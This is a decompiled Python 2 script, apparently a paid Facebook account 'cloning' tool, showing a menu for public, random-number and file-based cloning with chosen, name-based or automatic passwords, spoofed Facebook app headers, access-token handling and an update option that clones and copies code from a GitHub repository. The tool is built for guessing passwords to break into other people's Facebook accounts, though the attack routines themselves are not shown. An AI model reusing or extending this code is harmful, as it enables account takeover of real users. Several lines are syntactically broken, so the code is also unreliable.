# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-12 17:47:35.910329
import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError


os.system("rm -rf .txt")
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
pass

l1="100078"
l2="100079"

g='\x1b[1;92m'
r='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

try:
    import lolcat
except:
    os.system('pip2 install lolcat')
logo = """'\x1b[1;92m'   _     ____  _      ____  ____  ____  _      _____
'\x1b[1;92m'  / \ /|/  _ \/ \  /|/  _ \/ ___\/  _ \/ \__/|/  __/
'\x1b[1;92m' | |_||| / \|| |\ ||| | \||    \| / \|| |\/|||  \  
|'\x1b[1;92m'  | ||| |-||| | \||| |_/|\___ || \_/|| |  |||  /_ 
'\x1b[1;92m' \_/ \|\_/ \|\_/  \|\____/\____/\____/\_/  \|\____\

'\x1b[1;91m'   Author      :    JABBAR BALOCH  
'\x1b[1;92m'   Github      :     BJABBAR123
'\x1b[1;93m'   FB ID       :     JABBAR JANI
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :     03403319091        
"""
dec="2"
server="2"


rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":rsauser, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
sys.setdefaultencoding('utf8')



fuck=[]
idx=[]
oks=[]
cps=[]


    
    
def main_apv():
    try:
        token=open('token.txt','r').read()
    except:
        pass
    try:
        r=requests.get('https://graph.facebook.com/me?access_token=' + token)
        q=json.loads(r.text)
        m=q['name']
        print ''
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print "Trun On Data An Then \t"
        print("")
    except:
        print ('\x1b[1;91mToken on Chekpiont ')
        os.system('rm -rf token.txt')
    os.system('clear')
    print logo
    print ""
    print 39*'~'
    print "\x1b[1;93m[1]   Public Cloning      \x1b[1;92m(Login)"
    print "\x1b[1;91m[2]   Random Cloning     \x1b[1;92m (No Login)"
    print "\x1b[1;92m[3]   File Cloning       \x1b[1;92m (No Login)"
    print "\x1b[1;93m[4]   File Making Menu\x1b[1;92m    (Login)"
    print "\x1b[1;94m[5]   Check Subscription "
    print "\x1b[1;95m[6]   Update Tools"
    print "\x1b[1;96m[7]   For Any Help Massage WhatsApp"03403319091
    print 43*'~'
    print "\x1b[1;92m[*] \x1b[1;95m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp "
    print 43*'~'
    main_input()
def main_input():
    mx=raw_input('\x1b[1;92m[!] Select : ')
    if mx=='1':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        numcloning()
    elif mx=='3':
        print ""
        os.system ('clear')
        print ("")
        print ("")
        print ("")
        print "        [ File Cloning ]"
        print ""
        print " [ cloning with pass or name + pass ]"
        print ""
        print "[1] Cloning With Choice Pass"
        print "[2] Cloning With Name + Pass"
        print "[3] Cloning With Auto Pass"
        print "[0] Back"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            f_p_pass()
        elif c=='2':
            n_f_p_pass()
        elif c=="3":
            fileauto()
        else:
            main_system()
    elif mx=='4':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        grap()
    elif mx=='5':
    	os.system ('clear')
        print logo
        print ("")
        print ("")
        print ("")
        print ("")
        print ("        Congratulations Bro Your Pro")
        print ("        Member In RK Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/bjabbar123/Jani.git")
        os.system("rm -rf PAID")
        os.system("cp -f PAID/PAID \\.")
        os.system("rm -rf PAID")
        time.sleep(5)
        xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
        time.sleep(2)
			
			
    elif mx=='7':
        os.system("xdg-open https://wa.me/+923188214452")
        time.sleep(3)
        main_system()
